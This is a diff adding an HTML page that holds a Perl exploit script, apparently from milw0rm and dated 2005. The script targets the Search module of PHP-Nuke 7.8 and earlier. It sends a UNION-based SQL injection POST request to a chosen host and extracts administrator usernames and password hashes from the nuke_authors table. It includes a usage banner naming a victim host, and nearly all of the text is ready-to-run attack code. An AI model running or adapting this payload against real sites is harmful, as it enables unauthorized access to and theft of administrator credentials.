@@ -1,0 +1,66 @@
+<html>
+<head>
+<title>PHP-Nuke <= 7.8 Search Module Remote SQL Injection Exploit</title>
+<pre>
+#!/usr/bin/perl -w
+use IO::Socket;
+
+if (@ARGV &lt; 2)
+{
+print &quot;*---------------------------------------*\n&quot;;
+print &quot;* EXPLOIT for PHPNuke &lt;=7.8 *\n&quot;;
+print &quot;*---------------------------------------*\n\n&quot;;
+print &quot; Usage : \n&quot;;
+print &quot; PHPNuke[1] HOST /[path_phpnuke] \n\n&quot;;
+print &quot; HOST - Host where is phpnuke example: localhost \n\n&quot;;
+print &quot; Example :\n\n&quot;;
+print &quot; PHPNuke[1] www.victim.com /phpnuke/html/ \n\n&quot;;
+exit();
+}
+
+$HOST = $ARGV[0];
+$phpnuke_path = $ARGV[1];
+
+print &quot;\n&quot;;
+print &quot;Host : $HOST\n&quot;;
+print &quot;phpnuke_path : $phpnuke_path\n&quot;;
+print &quot;\n&quot;;
+$OK = 0;
+$modules = &quot;modules.php&quot;;
+$query = &quot;name=Search&amp;query=s%')/**/UNION/**/SELECT/**/0,pwd,0,aid,0,0,0,0,0,0/**/FROM/**/nuke_authors/*&quot;;
+$length = length $query;
+$GET = $phpnuke_path . $modules;
+print &quot;[*] Connecting at victim host [OK]\n&quot;;
+$send = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$HOST&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;[*] Connect [FAILED]\n&quot;;
+print &quot;[*] Connected [OK]\n&quot;;
+print &quot;[*] Sending exploit [OK]\n\n&quot;;
+print $send &quot;POST &quot;.$GET.&quot; HTTP/1.0\n&quot;;
+print $send &quot;Host: &quot;.%HOST.&quot;\n&quot;;
+print $send &quot;Referer: http://&quot;.%HOST.$phpnuke_path.&quot;modules.php?name=Search \r\n&quot;;
+print $send &quot;User-Agent: Internet Explorer 6.0 [SR]\n&quot;;
+print $send &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
+print $send &quot;Content-Length: &quot;.$length.&quot;\n\n&quot;;
+print $send $query;
+print $send &quot;Cookie: lang=english\r\n\r\n&quot;;
+print $send &quot;Connection: close\n\n&quot;;
+
+print &quot;[*] Exploit send [OK]\n&quot;;
+print &quot;[*] Wait for reply...[OK]\n&quot;;
+while ($answer = &lt;$send&gt;)
+{
+if ($answer =~ /=0&quot;&gt;&lt;b&gt;([^:]*)&lt;\/b&gt;/ ) { 
+$OK = 1;
+print &quot;[*] Success [OK]\n&quot;;
+print &quot;[*] USER: $1\n&quot;;
+}
+if ($answer =~ /=\&quot;0&quot;&gt;([^:]*)&lt;\/a&gt;/ ) { 
+$OK = 1;
+print &quot;[*] PASSWORD: $1\n&quot;;
+}
+}
+if ($OK == 0) { print &quot;[*] Exploit [FAILED]\n&quot;; }
+
+# milw0rm.com [2005-11-16]
+</pre>
+</html>
+
